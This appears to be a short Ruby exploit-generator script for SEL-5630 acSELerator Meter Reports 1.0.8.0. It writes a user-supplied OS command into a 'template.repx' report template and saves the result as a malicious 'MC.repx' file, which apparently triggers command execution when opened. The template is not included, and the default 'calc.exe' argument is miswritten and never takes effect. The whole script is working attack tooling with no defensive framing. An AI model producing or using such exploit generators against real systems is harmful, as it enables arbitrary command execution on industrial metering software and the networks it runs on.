#!/usr/bin/env ruby
# acSELerator Meter Reports SEL-5630 1.0.8.0

require 'rex'

cmd = ARGV[0 || "calc.exe"]

def usage
 puts "[*] SEL-5630 OS Command Execution"
 puts "[*] #{$0} <cmd>"
 exit
end

usage if ARGV.size < 1

begin
fd = File.open("template.repx", "rb" )
new_eve = fd.read(fd.stat.size)
fd.close

fuzz = new_eve

x = File.new("MC.repx","wb")
x.write(fuzz.gsub(/CMD/, cmd))
x.close
rescue => e
puts "[!] #{e.to_s}"
end
